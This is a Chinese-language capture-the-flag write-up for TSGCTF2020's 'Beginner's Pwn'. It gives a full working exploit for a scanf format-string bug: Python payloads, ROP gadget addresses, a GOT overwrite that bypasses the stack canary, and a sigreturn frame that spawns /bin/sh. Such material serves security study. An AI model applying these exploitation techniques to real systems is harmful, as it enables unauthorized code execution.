# TSGCTF2020 Beginner's Pwn WP

## 题目简述

程序把最多 24 字节读入栈缓冲区，随后直接把缓冲区作为 `scanf` 格式字符串：

```c
int main(void) {
    char buf[24];
    readn(buf, 24);
    scanf(buf);
    return 0;
}
```

二进制启用 Canary 与 NX，但无 PIE 且为 Partial RELRO。自定义 `readn` 用内联 `read` 系统调用逐字节读取，结束时没有恢复寄存器，因此调用 `scanf` 时，`rsi` 仍指向 `buf` 最后写入的位置。攻击者可以用自定义 `%s` 转换把长字符串写到这个栈地址造成溢出，同时借栈上的地址参数改写可写 GOT。

## 解题过程

第一段输入为：

```python
got_stack_chk_fail = 0x404018
io.sendline(b"%s %7$s\x00" + p64(got_stack_chk_fail))
```

格式串本身和附加地址都位于 `buf`。第一个 `%s` 使用残留在 `rsi` 中的栈地址作为目标，第二个 `%7$s` 则把 `buf` 中的 `__stack_chk_fail@GOT` 当作目标。下一段输入先通过第一个转换越过 24 字节缓冲区、Canary 和保存的返回地址，布置 ROP 与 sigreturn frame；第三段输入由 `%7$s` 连续写入 GOT 区域：

```python
ret = 0x401202
scanf_plt_6 = 0x401046
got_scanf = 0x404020
binsh = got_scanf + 8
arg15 = got_scanf + 16

got_payload = (
    p64(ret) +             # __stack_chk_fail@GOT
    p64(scanf_plt_6) +     # scanf@GOT
    b"/bin/sh\x00" +
    b"%1$dA" * 15
)
```

Canary 已被破坏，函数会调用 `__stack_chk_fail@PLT`；其 GOT 项现在指向单个 `ret`，于是控制流回到函数尾部的 `leave; ret`，再进入覆盖在栈上的 ROP。

ROP 先调用一次 `scanf`。格式 `%1$dA` 重复 15 次，15 个转换都把结果写到同一处无害可写地址，但 `scanf` 的返回值为成功转换数 15，即把 `rax` 设置为 Linux x86-64 的 `rt_sigreturn` 系统调用号：

```python
rop = [
    0x4012c1, 0x404010, 0x404010,  # pop rsi; pop r15; ret
    0x4012c3, arg15,              # pop rdi; ret
    0x401040,                     # scanf@PLT
    0x40118f,                     # syscall
]
```

紧跟在 ROP 后的伪造信号帧把寄存器设为：

```text
rdi = 0x404028      # "/bin/sh"
rsi = 0
rdx = 0
rax = 59            # execve
rip = 0x40118f      # syscall
cs  = 0x33
```

最后发送 15 个可被 `%d` 解析的整数，`syscall` 触发 sigreturn，内核从伪造帧恢复寄存器，再次落到同一 `syscall` 执行 `execve("/bin/sh", 0, 0)`。取得 shell 后读取：

```text
TSGCTF{w3lc0m3_70_756c7f2_60_4h34d_pwnpwn~}
```

## 方法总结

本题把输入型格式串、残留参数寄存器、GOT 改写、栈溢出和 SROP 串成完整链。Canary 并未泄漏，而是通过把 `__stack_chk_fail` 改成 `ret` 绕过；缺少直接设置 `rax=15` 的 gadget，则利用 `scanf` 返回成功转换数完成。审计可变格式的输入函数时，不能只关注 `%n`：`%s` 本身就会向参数指针无界写入，而调用前残留的寄存器值也可能成为可利用目的地址。
